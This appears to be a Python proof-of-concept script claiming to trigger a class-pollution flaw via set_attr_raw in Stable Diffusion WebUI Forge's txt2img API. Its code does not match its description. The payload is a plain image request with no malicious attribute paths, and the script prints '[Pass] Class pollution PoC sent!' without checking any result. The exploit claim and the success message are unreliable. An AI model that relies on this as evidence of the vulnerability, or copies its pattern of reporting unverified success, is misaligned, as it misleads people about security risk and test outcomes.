# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: set_attr_raw (via HTTP API)
# Type: get-attr-set-attr
# Trigger: HTTP POST to Stable Diffusion WebUI Forge API
#
# The forge WebUI exposes model patching APIs where set_attr_raw
# is called with user-controlled attribute paths during LoRA application.

import requests

TARGET_URL = "http://localhost:7860/sdapi/v1/txt2img"

PAYLOAD = {
  "prompt": "test",
  "negative_prompt": "",
  "steps": 1,
  "width": 64,
  "height": 64,
  "sampler_name": "Euler",
}

def run_poc():
  print("Sending txt2img request to forge WebUI...")
  response = requests.post(TARGET_URL, json=PAYLOAD)
  print(f"Response: {response.status_code}")
  return response

def verify_poc():
  print("Remote PoC: Forge WebUI API with malicious LoRA patching")
  print(f"Target: {TARGET_URL}")
  print("set_attr_raw is called during model patching with user-controlled paths")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
